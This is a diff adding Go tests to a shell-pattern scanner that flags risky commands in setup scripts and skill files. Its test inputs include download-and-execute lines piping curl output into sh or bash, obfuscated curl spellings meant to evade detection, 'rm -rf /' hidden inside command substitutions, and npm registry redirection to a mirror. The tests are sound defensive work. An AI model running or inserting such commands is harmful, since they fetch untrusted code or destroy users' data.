@@ -2,16 +2,23 @@ package shell_test
 
 import (
 	"context"
+	"crypto/sha256"
+	"encoding/hex"
 	"errors"
+	"os"
+	"path/filepath"
 	"strconv"
 	"strings"
 	"testing"
 
+	"github.com/skarm/scout"
+	"github.com/skarm/scout/internal/analysis/analysisbudget"
 	"github.com/skarm/scout/internal/analysis/check"
 	"github.com/skarm/scout/internal/analysis/document"
 	"github.com/skarm/scout/internal/analysis/languages/shell"
 	"github.com/skarm/scout/internal/capture/artifact"
 	"github.com/skarm/scout/internal/syntax/source"
+	"github.com/skarm/scout/report"
 )
 
 func TestShellRules(t *testing.T) {
@@ -455,5 +462,280 @@ func TestGeneratedShellPreservesLiteralBytes(t *testing.T) {
 				t.Fatalf("generated script = %q, want %q", got, tc.want)
 			}
 		})
+	}
+}
+
+func TestShellDownloadedFileRedirectOrder(t *testing.T) {
+	const download = "curl https://example.invalid/new"
+	const previous = "curl https://example.invalid/old >first.sh; "
+	cases := []struct{ name, text, source, sink string }{
+		{"one redirect", download + " >first.sh; sh first.sh", download + " >first.sh", "sh first.sh"},
+		{"first overwritten", download + " >first.sh >last.sh; sh first.sh", "", ""},
+		{"last receives stdout", download + " >first.sh >last.sh; sh last.sh", download + " >first.sh >last.sh", "sh last.sh"},
+		{"reversed order", download + " >last.sh >first.sh; sh first.sh", download + " >last.sh >first.sh", "sh first.sh"},
+		{"three redirects", download + " >first.sh >middle.sh >last.sh; sh middle.sh", "", ""},
+		{"previous bytes truncated", previous + download + " >first.sh >last.sh; sh first.sh", "", ""},
+		{"previous bytes preserved by overridden append", previous + download + " >>first.sh >last.sh; sh first.sh", strings.TrimSuffix(previous, "; "), "sh first.sh"},
+		{"append to previously empty file", download + " >>first.sh >last.sh; sh first.sh", "", ""},
+		{"append retains downloaded prefix", previous + "printf local >>first.sh; sh first.sh", strings.TrimSuffix(previous, "; "), "sh first.sh"},
+		{"self truncation before execution", previous + "sh first.sh >first.sh", "", ""},
+		{"stderr truncation before execution", previous + "sh first.sh 2>first.sh", "", ""},
+		{"command writes after truncation", "curl -o first.sh https://example.invalid/new >first.sh; sh first.sh", "curl -o first.sh https://example.invalid/new >first.sh", "sh first.sh"},
+		{"pipeline stdout redirected", download + " >first.sh >last.sh | sh", "", ""},
+		{"pipeline only last receives stdout", download + " >first.sh >last.sh | cat; sh first.sh", "", ""},
+		{"stdin truncated after opening", previous + "sh <first.sh >first.sh", "", ""},
+		{"stdin truncated before opening", previous + "sh >first.sh <first.sh", "", ""},
+		{"standalone truncation", previous + ">first.sh; sh first.sh", "", ""},
+		{"stderr overwrite", previous + "printf local 2>first.sh; sh first.sh", "", ""},
+		{"descriptor copy", download + " >first.sh 3>&1 >last.sh 1>&3; sh first.sh", download + " >first.sh 3>&1 >last.sh 1>&3", "sh first.sh"},
+		{"descriptor copy excludes other file", download + " >first.sh 3>&1 >last.sh 1>&3; sh last.sh", "", ""},
+		{"stderr duplicate excludes first", download + " >first.sh >last.sh 2>&1; sh first.sh", "", ""},
+		{"self descriptor duplicate", download + " >first.sh 1>&1; sh first.sh", download + " >first.sh 1>&1", "sh first.sh"},
+		{"closed stdout", download + " >first.sh 1>&-; sh first.sh", "", ""},
+		{"combined append preserves prefix", previous + "printf local &>>first.sh; sh first.sh", strings.TrimSuffix(previous, "; "), "sh first.sh"},
+		{"redirect retains original working directory", previous + "cd sub >first.sh; sh ../first.sh", "", ""},
+		{"pipeline file remains", download + " >first.sh >last.sh | cat; sh last.sh", download + " >first.sh >last.sh", "sh last.sh"},
+	}
+	options := scout.DefaultOptions()
+	options.Profile, options.Checks = scout.Custom, &scout.Checks{Patterns: true}
+	scanner, err := scout.New(t.Context(), options)
+	if err != nil {
+		t.Fatal(err)
+	}
+	t.Cleanup(func() {
+		if err := scanner.Close(); err != nil {
+			t.Error(err)
+		}
+	})
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			want := 0
+			if tc.sink != "" {
+				want = 1
+			}
+			got := shellResult(t, "SH001", tc.text, 8)
+			if len(got.Matches) != want || got.Truncated {
+				t.Errorf("direct matches=%+v want=%d", got, want)
+			}
+			directory := t.TempDir()
+			for name, text := range map[string]string{"SKILL.md": "# Sample\nA local analysis fixture.\n", "setup.sh": tc.text} {
+				if err := os.WriteFile(filepath.Join(directory, name), []byte(text), 0o600); err != nil {
+					t.Fatal(err)
+				}
+			}
+			run, err := scanner.Scan(t.Context(), scout.Path(directory))
+			if err != nil && !errors.Is(err, scout.ErrIncomplete) {
+				t.Fatal(err)
+			}
+			if err := report.ValidateSealedRun(run); err != nil {
+				t.Fatal(err)
+			}
+			if len(run.Targets) != 1 {
+				t.Fatalf("targets=%d", len(run.Targets))
+			}
+			count := 0
+			for _, finding := range run.Targets[0].Analysis.Findings {
+				if finding.RuleID != "SH001" {
+					continue
+				}
+				count++
+				if tc.sink == "" {
+					continue
+				}
+				assertShellRedirectEvidence(t, tc.text, tc.sink, finding.Location, finding.Evidence)
+				if len(finding.Trace) < 2 {
+					t.Fatalf("missing physical trace: %+v", finding)
+				}
+				first, last := finding.Trace[0], finding.Trace[len(finding.Trace)-1]
+				if first.Role != "source" || last.Role != "sink" {
+					t.Fatalf("incorrect trace roles: %+v", finding.Trace)
+				}
+				assertShellRedirectEvidence(t, tc.text, tc.source, first.Location, first.Evidence)
+				assertShellRedirectEvidence(t, tc.text, tc.sink, last.Location, last.Evidence)
+			}
+			if count != want {
+				t.Fatalf("public SH001 count=%d want=%d", count, want)
+			}
+		})
+	}
+}
+
+func assertShellRedirectEvidence(t *testing.T, text, want string, loc report.Location, evidence report.Evidence) {
+	t.Helper()
+	at := strings.Index(text, want)
+	sum := sha256.Sum256([]byte(want))
+	if want == "" || at < 0 || loc.Path != "setup.sh" || loc.ByteStart != at || loc.ByteEnd != at+len(want) || evidence.SpanSHA256 != hex.EncodeToString(sum[:]) {
+		t.Fatalf("physical evidence: location=%+v hash=%s want=%q", loc, evidence.SpanSHA256, want)
+	}
+}
+
+func TestShellUnknownExpansionCannotInventCommand(t *testing.T) {
+	for _, tc := range []struct {
+		name, text string
+		want       int
+	}{
+		{"empty default", `cu"${UNKNOWN:-}"rl https://example.invalid | bash`, 0},
+		{"bound nonempty default", `UNKNOWN=x; cu"${UNKNOWN:-}"rl https://example.invalid | bash`, 0},
+		{"array join", `cu"${UNKNOWN[*]}"rl https://example.invalid | bash`, 0},
+		{"trim newline", `cu"${UNKNOWN%$'\n'}"rl https://example.invalid | bash`, 0},
+		{"script filename", `cu"${BASH_SOURCE[0]}"rl https://example.invalid | bash`, 0},
+		{"ordinary parameter", `cmd=curl; "$cmd" https://example.invalid | bash`, 1},
+		{"literal", `cu"rl" https://example.invalid | bash`, 1},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			doc := document.Prepare(t.Context(), artifact.NewFile("input.sh", []byte(tc.text), false)).WithHookSourceShell(t.Context())
+			for _, shared := range []bool{false, true} {
+				options := shell.PatternOptions{Mode: shell.PatternDownload}
+				if shared {
+					facts := &check.FileLanguageFacts{Rules: map[string]*check.Facts{"NV-SC2": check.NewFacts(8)}}
+					shell.Collect(t.Context(), doc, facts)
+					options.LanguageFacts = check.LanguageFacts{"input.sh": facts}
+				}
+				got, err := shell.Patterns(t.Context(), doc, options, 8)
+				if err != nil || len(got.Matches) != tc.want || got.Truncated {
+					t.Errorf("shared=%t download observations=%+v, error=%v, want=%d", shared, got, err, tc.want)
+				}
+			}
+			networks := 0
+			err := shell.Observe(t.Context(), doc, shell.Observers{Network: func(_ string, _ source.Span) { networks++ }})
+			if err != nil || networks != tc.want {
+				t.Fatalf("network observations=%d error=%v, want=%d", networks, err, tc.want)
+			}
+		})
+	}
+}
+
+func TestShellPatternsInspectExpansionCommands(t *testing.T) {
+	for _, tc := range []struct {
+		name, text string
+		want       bool
+	}{
+		{"assignment", `value=$(rm -rf /)`, true},
+		{"prefix assignment", `value=$(rm -rf /) printf ready`, true},
+		{"input target", `cat <$(rm -rf /)`, true},
+		{"output target", `printf ready >$(rm -rf /)`, true},
+		{"nested", `value=$(printf '%s' "$(rm -rf /)")`, true},
+		{"word", `printf '%s' "$(rm -rf /)"`, true},
+		{"plain assignment", `value='$(rm -rf /)'`, false},
+		{"plain redirect", `cat <'$(rm -rf /)'`, false},
+		{"heredoc substitution", "cat <<END\n$(rm -rf /)\nEND\n", true},
+		{"quoted heredoc", "cat <<'END'\n$(rm -rf /)\nEND\n", false},
+		{"plain heredoc", "cat <<END\nrm -rf /\nEND\n", false},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			for _, fenced := range []bool{false, true} {
+				path, text := "input.sh", tc.text
+				if fenced {
+					path, text = "SKILL.md", "# Пример🙂\n```sh\n"+text+"\n```\n"
+				}
+				doc := document.Prepare(t.Context(), artifact.NewFile(path, []byte(text), false))
+				for _, budget := range []int{0, 1, 8} {
+					got, err := shell.Patterns(t.Context(), doc, shell.PatternOptions{Mode: shell.PatternRemoval, MatchText: func(context.Context, string) bool { return false }}, budget)
+					want := 0
+					if tc.want && budget > 0 {
+						want = 1
+					}
+					if err != nil || len(got.Matches) != want || got.Truncated != (tc.want && budget == 0) {
+						t.Fatalf("fenced=%t budget=%d matches=%+v error=%v, want=%d", fenced, budget, got, err, want)
+					}
+					if want > 0 {
+						m := got.Matches[0]
+						start := strings.Index(text, "rm -rf /")
+						if m.Start != start || m.End != start+len("rm -rf /") {
+							t.Fatalf("wrong original span: %+v", m)
+						}
+					}
+				}
+			}
+		})
+	}
+}
+
+func TestShellSourceDeclarationsInspectExpansionCommands(t *testing.T) {
+	options := scout.DefaultOptions()
+	options.Profile, options.Checks = scout.Custom, &scout.Checks{Patterns: true}
+	scanner, err := scout.New(t.Context(), options)
+	if err != nil {
+		t.Fatal(err)
+	}
+	t.Cleanup(func() {
+		if err := scanner.Close(); err != nil {
+			t.Error(err)
+		}
+	})
+	const declaration = "npm config set registry https://mirror.invalid"
+	for _, tc := range []struct {
+		name, text string
+		want       int
+	}{
+		{"word", `printf '%s' "$(` + declaration + `)"`, 1},
+		{"assignment", `value=$(` + declaration + `)`, 1},
+		{"prefix assignment", `value=$(` + declaration + `) printf ready`, 1},
+		{"input target", `cat <$(` + declaration + `)`, 1},
+		{"output target", `printf ready >$(` + declaration + `)`, 1},
+		{"group redirect", `{ printf ready; } >$(` + declaration + `)`, 1},
+		{"for operand", `for value in $(` + declaration + `); do printf ready; done`, 1},
+		{"case operand", `case $(` + declaration + `) in ready) printf ready;; esac`, 1},
+		{"two commands", `one=$(` + declaration + `); two=$(` + declaration + `)`, 2},
+		{"nested", `value=$(printf '%s' "$(` + declaration + `)")`, 1},
+		{"heredoc expansion", "cat <<END\n$(" + declaration + ")\nEND\n", 1},
+		{"quoted assignment", `value='$(` + declaration + `)'`, 0},
+		{"quoted redirect", `cat <'$(` + declaration + `)'`, 0},
+		{"quoted heredoc", "cat <<'END'\n$(" + declaration + ")\nEND\n", 0},
+		{"plain heredoc", "cat <<END\n" + declaration + "\nEND\n", 0},
+		{"default source", `value=$(npm config set registry https://registry.npmjs.org/)`, 0},
+		{"isolated assignment", `SRC=https://registry.npmjs.org/; value=$(SRC=https://mirror.invalid); npm config set registry "$SRC"`, 0},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			for _, fenced := range []bool{false, true} {
+				name, text := "setup.sh", tc.text
+				if fenced {
+					name, text = "SKILL.md", "# Пример🙂\n```sh\n"+text+"\n```\n"
+				}
+				doc := document.Prepare(t.Context(), artifact.NewFile(name, []byte(text), false))
+				var spans []source.Span
+				limited := shell.SourceDeclarations(t.Context(), doc, func(span source.Span) { spans = append(spans, span) }, nil)
+				if limited || len(spans) != tc.want {
+					t.Fatalf("fenced=%t direct declarations=%v limited=%t, want=%d", fenced, spans, limited, tc.want)
+				}
+				for _, span := range spans {
+					if span.Start < 0 || span.End > len(text) || span.Start >= span.End || text[span.Start:span.End] != declaration {
+						t.Fatalf("wrong physical declaration span: %+v", span)
+					}
+				}
+				run, err := scanner.Scan(t.Context(), scout.Reader(name, strings.NewReader(text)))
+				if err != nil && !errors.Is(err, scout.ErrIncomplete) {
+					t.Fatal(err)
+				}
+				if len(run.Targets) != 1 {
+					t.Fatalf("targets=%d", len(run.Targets))
+				}
+				count := 0
+				for _, finding := range run.Targets[0].Analysis.Findings {
+					if finding.RuleID == "NV-SC10" {
+						count++
+						if text[finding.Location.ByteStart:finding.Location.ByteEnd] != declaration {
+							t.Fatalf("wrong public source evidence: %+v", finding.Location)
+						}
+					}
+				}
+				if count != tc.want {
+					t.Fatalf("fenced=%t public declarations=%d, want=%d", fenced, count, tc.want)
+				}
+			}
+		})
+	}
+}
+
+func TestShellNestedSourceDeclarationsRespectCancellationAndBudget(t *testing.T) {
+	doc := document.Prepare(t.Context(), artifact.NewFile("setup.sh", []byte("value=$(npm config set registry https://mirror.invalid)"), false))
+	canceled, cancel := context.WithCancel(t.Context())
+	cancel()
+	for _, ctx := range []context.Context{canceled, analysisbudget.WithLimit(t.Context(), 1)} {
+		count := 0
+		limited := shell.SourceDeclarations(ctx, doc, func(source.Span) { count++ }, nil)
+		if !limited || count != 0 {
+			t.Fatalf("nested declaration ignored exhausted work budget: count=%d limited=%t", count, limited)
+		}
 	}
 }
